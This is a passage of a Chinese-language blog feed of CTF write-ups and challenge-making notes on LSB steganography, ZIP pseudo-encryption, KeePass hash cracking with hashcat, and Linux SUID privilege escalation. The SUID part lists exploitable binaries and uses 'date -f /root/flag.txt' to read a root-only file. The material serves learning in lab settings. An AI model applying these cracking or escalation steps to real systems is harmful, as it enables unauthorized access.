<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>leaf</title>
  
  
  <link href="http://just-aleaf.github.io/atom.xml" rel="self"/>
  
  <link href="http://just-aleaf.github.io/"/>
  <updated>2022-08-07T08:38:36.255Z</updated>
  <id>http://just-aleaf.github.io/</id>
  
  <author>
    <name>叶子</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>出题方法</title>
    <link href="http://just-aleaf.github.io/2022/08/06/%E5%87%BA%E9%A2%98%E6%96%B9%E6%B3%95/"/>
    <id>http://just-aleaf.github.io/2022/08/06/%E5%87%BA%E9%A2%98%E6%96%B9%E6%B3%95/</id>
    <published>2022-08-06T08:52:09.000Z</published>
    <updated>2022-08-07T08:38:36.255Z</updated>
    
    <content type="html"><![CDATA[<p>我认为一道题最好的理解方式就是去将他制作出来以制作者的心思去理解一道题</p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="1-lsb隐写"><a href="#1-lsb隐写" class="headerlink" title="(1)lsb隐写"></a>(1)lsb隐写</h2><h3 id="什么是lsb隐写"><a href="#什么是lsb隐写" class="headerlink" title="什么是lsb隐写:"></a>什么是lsb隐写:</h3><p>lsb隐写就是通过修改RGB颜色分量的最低有效位(lsb)，而人眼注意不到这前后的变化，通过这个变化来对信息进行隐藏</p><h3 id="分析工具：StegSolve"><a href="#分析工具：StegSolve" class="headerlink" title="分析工具：StegSolve"></a>分析工具：StegSolve</h3><p>通过StegSolve打开对应图片，然后对RGB三原色进行最低位选择，就会显示出隐写内容</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/06/62ee2e665909d.jpg" alt="QQ截图20220806170300.jpg"></p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/06/62ee2e66da9b2.jpg" alt="QQ截图20220806170317.jpg"></p><p>除此之外还有zsteg和binwalk强推zsteg</p><h3 id="制题思路"><a href="#制题思路" class="headerlink" title="制题思路"></a>制题思路</h3><p>参考大佬的代码自己修改编写的隐写脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">from PIL import Image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_key(str):</span><br><span class="line">    with open(str,&quot;rb&quot;) as f:</span><br><span class="line">        s=f.read()</span><br><span class="line">        string=&quot;&quot;</span><br><span class="line">        for i in range(len(s)):#这里将加密文件通过ord转换为十进制然后在转换为二进制，因为二进制前有’0b‘，利用replace替换，通过zfill函数补位为8位</span><br><span class="line">            string=string+&quot;&quot;+(bin(s[i]).replace(&#x27;0b&#x27;,&#x27;&#x27;)).zfill(8)</span><br><span class="line">        return string</span><br><span class="line"></span><br><span class="line">def mod(x,y):</span><br><span class="line">    return x%y</span><br><span class="line"></span><br><span class="line">def encode(str1,str2,str3): </span><br><span class="line">    im = Image.open(str1) </span><br><span class="line">    #获取图片的宽和高</span><br><span class="line">    width,height= im.size[0],im.size[1]</span><br><span class="line">    count = 0</span><br><span class="line">    #获取需要隐藏的信息 </span><br><span class="line">    key = get_key(str2) </span><br><span class="line">    keylen = len(key)</span><br><span class="line">    for h in range(height):</span><br><span class="line">        for w in range(width):</span><br><span class="line">            pixel = im.getpixel((w,h))</span><br><span class="line">            a=pixel[0]</span><br><span class="line">            b=pixel[1]</span><br><span class="line">            c=pixel[2]</span><br><span class="line">            if count == keylen:</span><br><span class="line">                break</span><br><span class="line">        #隐藏信息（通过每个像素点的RGB余2，去掉每个像素点的最低为，然后将隐藏的信息取出一位，转换为整形，两者相加</span><br><span class="line">            a= a - mod(a, 2)+int(key[count])</span><br><span class="line">            count += 1</span><br><span class="line">            if count == keylen:</span><br><span class="line">                im.putpixel((w, h), (a, b, c))</span><br><span class="line">                break</span><br><span class="line">            b = b - mod(b, 2) + int(key[count])</span><br><span class="line">            count += 1</span><br><span class="line">            if count == keylen:</span><br><span class="line">                im.putpixel((w, h), (a, b, c))</span><br><span class="line">                break</span><br><span class="line">            c = c - mod(c, 2) + int(key[count])</span><br><span class="line">            count += 1</span><br><span class="line">            if count == keylen:</span><br><span class="line">                im.putpixel((w, h), (a, b, c))</span><br><span class="line">                break</span><br><span class="line">            if count % 3 == 0:</span><br><span class="line">                im.putpixel((w, h), (a, b, c))</span><br><span class="line">    im.save(str3)</span><br><span class="line">    print(&quot;sucess&quot;)</span><br><span class="line"></span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">    if &#x27;-h&#x27; in sys.argv or &#x27;--help&#x27; in sys.argv or len(sys.argv) &lt; 2:</span><br><span class="line">        print(&#x27;Usage: python test.py &lt;cmd&gt; [arg...] [opts...]&#x27;)</span><br><span class="line">        print(&#x27;  cmds:&#x27;)</span><br><span class="line">        print(&#x27;    encode image + flag -&gt; image(encoded)&#x27;)</span><br><span class="line">        print(&#x27;    decode length + image(encoded) -&gt; flag&#x27;)</span><br><span class="line">        sys.exit(1)</span><br><span class="line">    cmd = sys.argv[1]</span><br><span class="line">    if cmd != &#x27;encode&#x27; and cmd != &#x27;decode&#x27;:</span><br><span class="line">        print(&#x27;wrong input&#x27;)</span><br><span class="line">        sys.exit(1)</span><br><span class="line">    str1 = sys.argv[2]#获取输入的第二个参数（载体图片的路径）</span><br><span class="line">    str2 = sys.argv[3]#获取输入的第三个参数（隐写的文件）</span><br><span class="line">    str3 = sys.argv[4]#获取输入的第四个参数（加密图片的保存路径）</span><br><span class="line">    if cmd != &#x27;encode&#x27; :</span><br><span class="line">        print(&#x27;Wrong cmd %s&#x27; % cmd)</span><br><span class="line">        sys.exit(1)</span><br><span class="line">    elif cmd==&#x27;encode&#x27;:</span><br><span class="line">        encode(str1,str2,str3)</span><br></pre></td></tr></table></figure><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/06/62ee620819314.jpg" alt="QQ截图20220806202810.jpg"></p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/06/62ee621f8692c.jpg" alt="QQ截图20220806204223.jpg"></p><p>发现多了一个图片(测试发现这里只能将加密后文件存储为png文件才会有效)</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/06/62ee622724278.jpg" alt="QQ截图20220806204307.jpg"></p><p>测试隐写成功</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/06/62ee623642e5c.jpg" alt="QQ截图20220806204320.jpg"></p><p>参考<a href="https://zhuanlan.zhihu.com/p/461716971">浅谈LSB隐写解题与出题 - 知乎 (zhihu.com)</a></p><h2 id="2-伪加密"><a href="#2-伪加密" class="headerlink" title="(2)伪加密"></a>(2)伪加密</h2><p>misc中还会经常遇到一种题型就是关于伪加密的</p><h3 id="什么是伪加密"><a href="#什么是伪加密" class="headerlink" title="什么是伪加密"></a>什么是伪加密</h3><p>伪加密就是对文件头的加密标志位进行修改，让用户点开的时候就会显示这是一个加密文件</p><p>谈及伪加密就需了解一下zip文件</p><p>zip文件由三部分组成：</p><p>压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志（文件的各区域开头是50 4B，之后两个字节是版本号，在之后两个字节是判断是否加密的标志位）</p><p>A.压缩源文件数据区：</p><p>50 4B 03 04 头文件标记</p><p>xx xx  压缩文件pkware版本</p><p>00 00 全局方式位标记（判断有无加密的标志位）</p><p>（这里判断加密于否的是在头文件标记后间隔2个字节）</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/07/62ef70e7e55d3.jpg" alt="QQ截图20220807155908.jpg"></p><p>B.压缩源文件目录区</p><p>50 4B 01 02  目录中文件文件头标记</p><p>XX XX  压缩使用的pkware版本</p><p>XX XX  解压文件所需的pkware版本</p><p>00 00 全局方式位标记（判断有无加密的标记位，当改为09，00就可以达到伪加密）</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/07/62ef70e930dbf.jpg" alt="QQ截图20220807155920.jpg"></p><p>C.压缩源文件目录结束标志</p><p>50 4B 05 06 目录结束标志</p><p>对于识别真假加密的话个人感觉总结的规律有时候也有不准确的时候所以就不进行整理，可以自己修改全局方式标记来进行判断</p><h3 id="分析工具：010-Editor"><a href="#分析工具：010-Editor" class="headerlink" title="分析工具：010 Editor"></a>分析工具：010 Editor</h3><p>这里直接通过010 Editor就可以看到文件对应十六进制寻找到对应文件位置即可</p><h3 id="制题思路-1"><a href="#制题思路-1" class="headerlink" title="制题思路"></a>制题思路</h3><p>这里采用ZipCenOp.jar工具</p><p>准备一个无密码的zip文件</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/07/62ef72cb16342.jpg" alt="QQ截图20220807160731.jpg"></p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/07/62ef730d03d47.jpg" alt="QQ截图20220807160838.jpg"></p><p>这里不需要理会报错是java版本问题</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/07/62ef732ecaf90.jpg" alt="QQ截图20220807160911.jpg"></p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/07/62ef73c43f10b.jpg" alt="QQ截图20220807161137.jpg"></p><p>解密的使用命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ZipCenOp.jar r 1.zip</span><br></pre></td></tr></table></figure><p>参考<a href="https://jingyan.baidu.com/article/19192ad8e8f233e53e570719.html">zip格式压缩包伪加密方法-百度经验 (baidu.com)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;我认为一道题最好的理解方式就是去将他制作出来以制作者的心思去理解一道题&lt;/p&gt;
&lt;h1 id=&quot;MISC&quot;&gt;&lt;a href=&quot;#MISC&quot; class=&quot;headerlink&quot; title=&quot;MISC&quot;&gt;&lt;/a&gt;MISC&lt;/h1&gt;&lt;h2 id=&quot;1-lsb隐写&quot;&gt;&lt;a hr</summary>
      
    
    
    
    <category term="CTF" scheme="http://just-aleaf.github.io/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://just-aleaf.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2022DASCTF Apr X FATE 防疫挑战赛</title>
    <link href="http://just-aleaf.github.io/2022/08/05/2022DASCTF-Apr-X-FATE-%E9%98%B2%E7%96%AB%E6%8C%91%E6%88%98%E8%B5%9B/"/>
    <id>http://just-aleaf.github.io/2022/08/05/2022DASCTF-Apr-X-FATE-%E9%98%B2%E7%96%AB%E6%8C%91%E6%88%98%E8%B5%9B/</id>
    <published>2022-08-05T11:55:58.000Z</published>
    <updated>2022-08-08T15:42:28.902Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="SimpleFlow"><a href="#SimpleFlow" class="headerlink" title="SimpleFlow"></a>SimpleFlow</h2><p>下载附件发现是一个流量包</p><p>尝试binwalk看看有没有什么隐写内容</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/07/62ef7ce2a8726.jpg" alt="QQ截图20220807165010.jpg"></p><p>发现一个flag.txt和一个加密的压缩包</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/07/62ef7ce38ad00.jpg" alt="QQ截图20220807165023.jpg"></p><p>也没有别的有用信息尝试从流量包中查找有没有关于flag或者密码的其他内容</p><p>进入wireshark查找flag.txt相关内容</p><p>发现有四条发现是base64加密过的蚁剑流量</p><p>一一进行解密（这里要注意蚁剑流量解码后s需要去除传入参数的前两个字符）</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/07/62efafad9c5fa.jpg" alt="QQ截图20220807202606.jpg"></p><p>解密发现压缩包密码</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/07/62efb0c260c39.jpg" alt="QQ截图20220807203154.jpg"></p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/07/62efb0f8735be.jpg" alt="QQ截图20220807203235.jpg"></p><h2 id="熟悉的猫"><a href="#熟悉的猫" class="headerlink" title="熟悉的猫"></a>熟悉的猫</h2><p>下载附件发现是一个zip文件名的文件修改后缀位zip</p><p>内含一个kdbx和zip文件(加密)</p><p>kdbx文件是windows的密码文件需要用到keepass进行打开</p><p>发现加密</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/08/62f0f0663cf9b.jpg" alt="QQ截图20220808191241.jpg"></p><p>hashcat暴力破解</p><p>先使用keepass2john获取hash值</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/08/62f0f072eb5c7.jpg" alt="QQ截图20220808191405.jpg"></p><p>这里生成的txt中要打开将前面的len5:去掉（把那个不属于hash值）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13400 keepass.txt -a 0 password.txt --force//这里的password.txt是使用crunch生成的五位数密码本</span><br></pre></td></tr></table></figure><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/08/62f0f086a2a33.jpg" alt="QQ截图20220808191325.jpg"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13400 keepass.txt -a 0 password.txt --force --show //显示结果</span><br></pre></td></tr></table></figure><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/08/62f0f1393bfb6.jpg" alt="QQ截图20220808191340.jpg"></p><p>获得对应密码jbRw5PB2kFmor6IeYYil</p><p>解开kbdx文件发现zip文件的密码解密hint中发现k值同时发现存在零宽隐写</p><p><a href="http://330k.github.io/misc_tools/unicode_steganography.html">Unicode Steganography with Zero-Width Characters (330k.github.io)</a></p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/08/62f12a794a6be.jpg" alt="QQ截图20220808232252.jpg"></p><p>通过k和获取到的两个值猜测这里有塔珀自指公式的加密</p><p><a href="https://blog.csdn.net/ygys1234/article/details/109686348">(41条消息) 代码急转弯——Tupper（塔珀自指公式）_ygys1234的博客-CSDN博客_塔珀自指公式</a></p><p>然后用大佬脚本将k和两个对应值修改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line">from PIL import Image</span><br><span class="line">a=22</span><br><span class="line">b=160</span><br><span class="line">def Tupper_self_referential_formula(k): </span><br><span class="line">    aa = np.zeros((a,b))</span><br><span class="line">    def f(x, y):</span><br><span class="line">        y += k</span><br><span class="line">        a1 = 2**-(-a*x - y%a)</span><br><span class="line">        a2 = (y // a) // a1</span><br><span class="line">        return 1 if a2 % 2 &gt; 0.5 else 0</span><br><span class="line"> </span><br><span class="line">    for y in range(a):</span><br><span class="line">        for x in range(b):</span><br><span class="line">            aa[y, x] = f(x, y)</span><br><span class="line">    </span><br><span class="line">    return aa[:,::-1]</span><br><span class="line"></span><br><span class="line">k = 92898203278702907929705938676672021500394791427205757369123489204565300324859717082409892641951206664564991991489354661871425872649524078000948199832659815275909285198829276929014694628110159824930931595166203271443269827449505707655085842563682060910813942504507936625555735585913273575050118552353192682955310220323463465408645422334101446471078933149287336241772448338428740302833855616421538520769267636119285948674549756604384946996184385407505456168240123319785800909933214695711828013483981731933773017336944656397583872267126767778549745087854794302808950100966582558761224454242018467578959766617176016660101690140279961968740323327369347164623746391335756442566959352876706364265509834319910419399748338894746638758652286771979896573695823608678008814861640308571256880794312652055957150464513950305355055495262375870102898500643010471425931450046440860841589302890250456138060738689526283389256801969190204127358098408264204643882520969704221896973544620102494391269663693407573658064279947688509910028257209987991480259150865283245150325813888942058</span><br><span class="line">aa = Tupper_self_referential_formula(k)</span><br><span class="line">plt.figure(figsize=(15,10))</span><br><span class="line">plt.imshow(aa,origin=&#x27;lower&#x27;)</span><br><span class="line">plt.savefig(&quot;tupper.png&quot;)</span><br><span class="line">img = Image.open(&#x27;flag.png&#x27;)</span><br></pre></td></tr></table></figure><p>这里得到下图（直接得到的图片是翻转的需要旋转180度）</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/08/62f0f05fbd756.png" alt="tupper.png">得到33，121，144三个值</p><p>更具经验猜测这里用了猫脸变换(arnold变换)</p><p>使用网上脚本进行恢复</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from PIL import Image</span><br><span class="line"> </span><br><span class="line">img = Image.open(&#x27;flag.png&#x27;)</span><br><span class="line">if img.mode == &quot;P&quot;:</span><br><span class="line">    img = img.convert(&quot;RGB&quot;)</span><br><span class="line">assert img.size[0] == img.size[1]</span><br><span class="line">dim = width, height = img.size</span><br><span class="line"> </span><br><span class="line">st = 33</span><br><span class="line">a = 121</span><br><span class="line">b = 144</span><br><span class="line">for _ in range(st):</span><br><span class="line">    with Image.new(img.mode, dim) as canvas:</span><br><span class="line">        for nx in range(img.size[0]):</span><br><span class="line">            for ny in range(img.size[0]):</span><br><span class="line">                y = (ny - nx * a) % width</span><br><span class="line">                x = (nx - y * b) % height</span><br><span class="line">                canvas.putpixel((y, x), img.getpixel((ny, nx)))</span><br><span class="line">canvas.show()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/08/62f12eb8083da.jpg" alt="QQ截图20220808234133.jpg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;MISC&quot;&gt;&lt;a href=&quot;#MISC&quot; class=&quot;headerlink&quot; title=&quot;MISC&quot;&gt;&lt;/a&gt;MISC&lt;/h1&gt;&lt;h2 id=&quot;SimpleFlow&quot;&gt;&lt;a href=&quot;#SimpleFlow&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="CTF" scheme="http://just-aleaf.github.io/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://just-aleaf.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>出题人挑战赛</title>
    <link href="http://just-aleaf.github.io/2022/08/02/%E5%87%BA%E9%A2%98%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9B/"/>
    <id>http://just-aleaf.github.io/2022/08/02/%E5%87%BA%E9%A2%98%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9B/</id>
    <published>2022-08-02T12:28:43.000Z</published>
    <updated>2022-08-05T04:10:03.727Z</updated>
    
    <content type="html"><![CDATA[<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="1-不懂PCB的厨师不是好黑客"><a href="#1-不懂PCB的厨师不是好黑客" class="headerlink" title="(1)不懂PCB的厨师不是好黑客"></a>(1)不懂PCB的厨师不是好黑客</h3><p>我们这里下载附件解压发现有题目中的PCB文件夹010打开</p><p>然后很简单的crtl+f搜索就可以找到flag</p><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e9194bf3cd7.jpg" alt="QQ截图20220802203159.jpg"></p><h3 id="2-卡比"><a href="#2-卡比" class="headerlink" title="(2)卡比"></a>(2)卡比</h3><p>知识点:卡比文字，维吉尼亚解密</p><p>出题人得多喜欢卡比，确实没想到对应游戏里面的语言，哈哈哈哈哈</p><p>上网搜索卡比语言（即使知道是什么也是找了好久）</p><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e91b13d04d4.jpg" alt="QQ截图20220802203938.jpg"></p><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e91b31069a9.jpg" alt="QQ截图20220802204008.jpg"></p><p>将给定附件对应翻译即可得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PTRH&#123;GWDVSWVQBFISZSZ&#125;</span><br></pre></td></tr></table></figure><p>然后这里直接提交发现错误，然后无脑尝试base64发现也不对</p><p>然后又想到维吉尼亚密码（加密后也全为英文）</p><p><a href="https://www.qqxiuzi.cn/bianma/weijiniyamima.php">维吉尼亚密码在线加密解密 - 千千秀字 (qqxiuzi.cn)</a></p><p>但是这种解密需要密钥</p><p>找遍全部也只有kirby尝试一波发现成功</p><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e91bcc89f81.jpg" alt="QQ截图20220802204243.jpg"></p><h3 id="3-rootme"><a href="#3-rootme" class="headerlink" title="(3)rootme"></a>(3)rootme</h3><p>知识点:SUID提权</p><p>开启靶机然后使用xshell进行连接</p><p>连接之后尝试管理员权限发现并不可行尝试提权</p><p>提权之前就要先了解一下SUID提权</p><h4 id="SUID提权（LINUX）"><a href="#SUID提权（LINUX）" class="headerlink" title="SUID提权（LINUX）"></a>SUID提权（LINUX）</h4><p>A.什么是SUID</p><p>首先我们要先了解什么是SUID，</p><p>SUID是LINUX中的一种特殊类型权限（只作用于二进制可执行文件），当用户在运行一个程序的时候，如果这个程序有SUID权限，那么该程序运行进程的属主就不是发起者，而是文件所属的属主（通俗来说就是当我们以普通用户去运行属主为root且设置了SUID权限的进程时我们可以以root权限去运行该进程达到提权）</p><p>B.设置SUID权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod u+s 文件名   //设置SUID</span><br><span class="line">chmod u-s 文件名   //去除SUID</span><br></pre></td></tr></table></figure><p>可以通过ls -al查看文件的权限</p><p>当我们通过chmod设置权限之后我们可以观察到x变为了s，代表设置成功</p><p>C. 提权思路</p><p>运行root用户所拥有的SUID文件，当其他用户运行该文件的时候就会获取root身份</p><p>这里就需要知道可以进行提权的root设置的SUID权限的二进制可执行文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nmap </span><br><span class="line">vim</span><br><span class="line">find</span><br><span class="line">bash</span><br><span class="line">more</span><br><span class="line">less</span><br><span class="line">nano</span><br><span class="line">cp</span><br><span class="line">awk</span><br></pre></td></tr></table></figure><p>D.探测具有SUID权限的二进制可执行文件</p><p>运用于不同系统</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null/</span><br><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb&#123;&#125;</span><br></pre></td></tr></table></figure><p>这里以第一条为例进行详细解释</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null/</span><br><span class="line">-u=s:查找root用户拥有的文件</span><br><span class="line">-type:设置正在寻找的文件类型</span><br><span class="line">f:常规文件</span><br><span class="line">2&gt;/dell/null/:默认&gt;/dev/null为1时为标准输出，为2时会将错误输出到垃圾桶中，通俗点就是不会显示错误</span><br><span class="line">整句的意思就是从/目录种查找属主为root同时具备SUID权限的二进制文件并回显，如果有错误就将其输出到dev/null（垃圾桶）</span><br></pre></td></tr></table></figure><p>E.防范措施</p><p>减少对二进制可执行文件赋予SUID权限</p><p>回归题目</p><p>这里我们就需要用到SUID进行提权</p><p>首先查找具有SUID权限属主为root的二进制可执行文件</p><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e931c24e544.jpg" alt="QQ截图20220802221624.jpg"></p><p><a href="https://gtfobins.github.io/">GTFOBins</a></p><p>GTFOBins是一个精心策划的Unix二进制文件列表，可以用来绕过错误配置系统中的本地安全。介绍了当你有某些二进制文件可用是，如何过去root权限</p><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e9414c1f6e0.jpg" alt="QQ截图20220802232234.jpg"></p><p>通过题中提示可以看到flag位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">date -f /root/flag.txt</span><br></pre></td></tr></table></figure><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e942d799ad1.jpg" alt="QQ截图20220802232909.jpg"></p><h3 id="4-神必流量"><a href="#4-神必流量" class="headerlink" title="(4)神必流量"></a>(4)神必流量</h3><p>下载附件发现是一个流量包</p><p>binwalk查看是否有什么隐藏文件</p><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/03/62e94aa7959f4.jpg" alt="QQ截图20220802235051.jpg"></p><p>发现有一个7z文件进行提取</p><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/03/62e94aa80a618.jpg" alt="QQ截图20220803000216.jpg"></p><p>提取后访问发现需要密码尝试发现并不是伪加密那就乖乖去找密码</p><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/03/62e94afe4c8d5.jpg" alt="QQ截图20220803000400.jpg"></p><p>只有流量包了尝试找到对应流量分析发现有个123456尝试输入</p><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/03/62e94bb638735.jpg" alt="QQ截图20220803000705.jpg"></p><p>解密成功给了一个地址</p><p><a href="https://drive.google.com/file/d/140MxBVh-OGvQUuk8tmOw4Xm8it9utIzo/view">https://drive.google.com/file/d/140MxBVh-OGvQUuk8tmOw4Xm8it9utIzo/view</a></p><h3 id="4-噪音"><a href="#4-噪音" class="headerlink" title="(4)噪音"></a>(4)噪音</h3><h3 id="5-delflag"><a href="#5-delflag" class="headerlink" title="(5)delflag"></a>(5)delflag</h3><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-Power-Cookie"><a href="#1-Power-Cookie" class="headerlink" title="(1)Power Cookie"></a>(1)Power Cookie</h3><p>知识点：cookie修改</p><p>启动靶机访问抓包发现发送之后Set-cookie中有admin&#x3D;0值</p><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/03/62e9e2b9279a1.jpg" alt="QQ截图20220803105018.jpg"></p><p>尝试修改cookie为admin&#x3D;1得到flag</p><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/03/62e9e2b81b100.jpg" alt="QQ截图20220803105106.jpg"></p><h3 id="2-魔法浏览器"><a href="#2-魔法浏览器" class="headerlink" title="(2)魔法浏览器"></a>(2)魔法浏览器</h3><p>知识点:UA修改，js解密</p><p>启动靶场发现需要使用魔法浏览器进行访问</p><p>f12查看源代码发现给了一串关于ua修改的js</p><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/03/62e9e473a9429.jpg" alt="QQ截图20220803105811.jpg"></p><p>尝试运行</p><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/03/62e9e8fa733cc.jpg" alt="QQ截图20220803111807.jpg"></p><p>得到uaburp抓包修改获取flag</p><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/03/62e9e473e4a9d.jpg" alt="QQ截图20220803105839.jpg"></p><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/03/62e9e4742ba21.jpg" alt="QQ截图20220803105847.jpg"></p><h3 id="3-getme"><a href="#3-getme" class="headerlink" 